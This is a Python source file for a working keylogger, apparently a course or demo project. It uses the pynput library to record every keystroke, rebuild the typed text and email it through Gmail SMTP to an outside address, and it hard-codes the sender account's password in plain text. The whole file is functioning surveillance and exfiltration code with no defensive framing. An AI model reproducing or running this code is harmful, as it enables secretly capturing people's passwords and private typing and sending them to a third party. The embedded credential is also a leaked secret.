import os
import sys
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from enum import Enum
from pynput import keyboard
from os import path
# from pprint import pprint

# initial attempt to create a keylogger.
__author__ = 'RottenCrab'

# noinspection PyGlobalUndefined
global keymap
global final_keystrokes

ROOT = path.abspath(path.dirname(__file__))
COMMASPACE = ', '

# noinspection PyRedeclaration
keymap = []
# noinspection PyRedeclaration
final_keystrokes = []


def on_press(key):
    """
    This function is monitoring for keystrokes. When a keystroke
    occurs it will add it to the global list keymap. This is the
    basic function of this keylogger.
    :param key: the keystroke that happened.
    """
    try:
        # we are trying to get the character typed.
        keymap.append(key.char)
    except AttributeError:
        # in case of attribute error the user entered
        # a special key (eg. Enter Button).
        keymap.append(key)


def on_release(key):
    """
    This functions alerts when a key is been released.
    When the user press and releases the Esc key the program
    will be terminated.
    :param key: the key which is been released.
    :return: False, when the Esc key will be released.
    """
    if key == keyboard.Key.esc:
        return False


def collector():
    """
    This function is collecting the events from the
    keyboard.
    """
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


def check_items(ls):
    """
    This function is a debugging function. We are using it to
    see the enumerations (special keys) contained in the global
    list keymap.
    :param ls: The list we want to check if it contains enumerations.
    """
    print("=" * 50)
    for _ in ls:
        print(type(_))
        if isinstance(_, Enum):
            print('enumeration found')
            # print(_.name)
            special_key(_)
            # the data types returned are strings and key enumerations.


def keystroke_join():
    """
    This function modifies they final_keystrokes global list
    by organizing the keystrokes. If we encounter a normal string
    (like a character) in keymap list we are appending it to
    final_keystrokes. Otherwise (if the registered key is a special
    key), we are invoking special_key() function to specify how we
    should handle the final_keystrokes list.
    """
    for _ in keymap:
        if type(_) is str:
            final_keystrokes.append(_)
        else:
            special_key(_)


def special_key(key):
    """
    This function specifies how to handle the special
    keys.
    :param key: The special key (enter, space, backspace, ctrl etc.)
    """
    if key.name.lower() == "enter":
        final_keystrokes.append("\n")
    elif key.name.lower() == "backspace":
        if len(final_keystrokes) > 0:
            final_keystrokes.pop()
    elif key.name.lower() == "space":
        final_keystrokes.append(" ")
    elif key.name.lower() == "ctrl":
        # if the ctrl key is pressed it is probably a shortcut and
        # we do not want that
        position = keymap.index(key)
        del[keymap[position]]
        del[keymap[position]]
    else:
        pass


def final():
    """
    This function maps all the keyboard events
    the user made in the current session.
    :return: the events as a formatted string.
    """
    keystroke_join()
    return "".join([x for x in final_keystrokes])


def print_writer():
    """
    with this function you can write all the key events
    in an external txt file.
    """
    with open(ROOT + '/../data/data_file', 'w') as log:
        to_print = final()
        log.write(to_print)


def sent_email():
    sender = 'cssdemoaueb@gmail.com'
    gmail_password = 'cssdemo1234567890'
    recipients = ['csec.aueb@gmail.com']
    message = final()

    # Create the enclosing (outer) message
    outer = MIMEMultipart()
    outer['Subject'] = 'Demo Attachment'
    outer['To'] = COMMASPACE.join(recipients)
    outer['From'] = sender
    outer.attach(MIMEText(message, 'plain'))
    outer.preamble = 'You will not see this in a MIME-aware mail reader.\n'

    # List of attachments
    #  attachments = [ROOT + '/../data/data_file']

    # Add the attachments to the message
    #  for file in attachments:
        #  try:
            #  with open(file, 'rb') as fp:
                #  msg = MIMEBase('application', "octet-stream")
                #  msg.set_payload(fp.read())
            #  encoders.encode_base64(msg)
            #  msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(file))
            #  outer.attach(msg)
        #  except:
            #  print("Unable to open one of the attachments. Error: ", sys.exc_info()[0])
            #  raise

    composed = outer.as_string()

    # Send the email
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login(sender, gmail_password)
            s.sendmail(sender, recipients, composed)
            s.close()
        #  print("Email sent!")
    except:
        print("Unable to send the email. Error: ", sys.exc_info()[0])
        raise


if __name__ == '__main__':
    collector()
    # check_items(keymap)
    # pprint(keymap)
    # print_writer()
    # print(final())
    sent_email()
